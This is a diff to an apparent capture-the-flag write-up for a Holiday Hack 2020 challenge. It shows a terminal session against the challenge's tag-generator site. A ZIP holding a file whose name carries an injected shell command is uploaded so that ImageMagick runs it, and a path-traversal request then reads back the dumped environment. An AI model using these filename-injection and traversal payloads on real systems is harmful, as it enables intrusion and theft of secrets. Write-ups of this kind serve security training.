@@ -33,14 +33,13 @@ curl https://tag-generator.kringlecastle.com/image?id=../../../../../app/lib/app
 This code allows to place uploaded files in a chosen place on the remote system using the ZIP upload function.
 Furthermore the application starts the `convert` tool from  ImageMagick which makes it possible to inject shell commands:
 ```
-jsw@io:~/Documents/Hacking-Challenges/Holidayhack-2020/objective-8/test/z$ touch \'\`env\>joergen\`\;\'.jpg
-jsw@io:~/Documents/Hacking-Challenges/Holidayhack-2020/objective-8/test/z$ rm joergen.zip
-rm: cannot remove 'joergen.zip': No such file or directory
-jsw@io:~/Documents/Hacking-Challenges/Holidayhack-2020/objective-8/test/z$ zip joergen.zip *.jpg
+jsw@io:*$ touch \'\`env\>joergen\`\;\'.jpg
+jsw@io:*$ zip joergen.zip *.jpg
   adding: '`env>joergen`;'.jpg (stored 0%)
-jsw@io:~/Documents/Hacking-Challenges/Holidayhack-2020/objective-8/test/z$ curl https://tag-generator.kringlecastle.com/upload -F'my_file[]=@joergen.zip'
-["7ebc17be-a3ea-48f5-95ea-730e1b006520.jpg"]jsw@io:~/Documents/Hacking-Challenges/Holidayhack-2020/objective-8/test/z$ sleep 5
-jsw@io:~/Documents/Hacking-Challenges/Holidayhack-2020/objective-8/test/z$ curl https://tag-generator.kringlecastle.com/image?id=../../../../../tmp/joergen
+jsw@io:*$ curl https://tag-generator.kringlecastle.com/upload -F'my_file[]=@joergen.zip'
+["7ebc17be-a3ea-48f5-95ea-730e1b006520.jpg"]
+jsw@io:*$ sleep 5
+jsw@io:*t/z$ curl https://tag-generator.kringlecastle.com/image?id=../../../../../tmp/joergen
 RUBY_MAJOR=2.7
 GREETZ=JackFrostWasHere
 HOSTNAME=cbf2810b7573
@@ -59,7 +58,7 @@ BUNDLE_SILENCE_ROOT_WARNING=1
 
 ```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTEwMjM4MTc2MTksMTkzMzM2MTc4NywtMT
-Q2NzYxNTI2MiwtMjQzOTQyODY2LDEzMTIwNTY0NTMsOTIwNDU1
-ODY1LC0xNjA2MDc4MDQwXX0=
+eyJoaXN0b3J5IjpbLTc5NDA3MzQyOSwxOTMzMzYxNzg3LC0xND
+Y3NjE1MjYyLC0yNDM5NDI4NjYsMTMxMjA1NjQ1Myw5MjA0NTU4
+NjUsLTE2MDYwNzgwNDBdfQ==
 -->
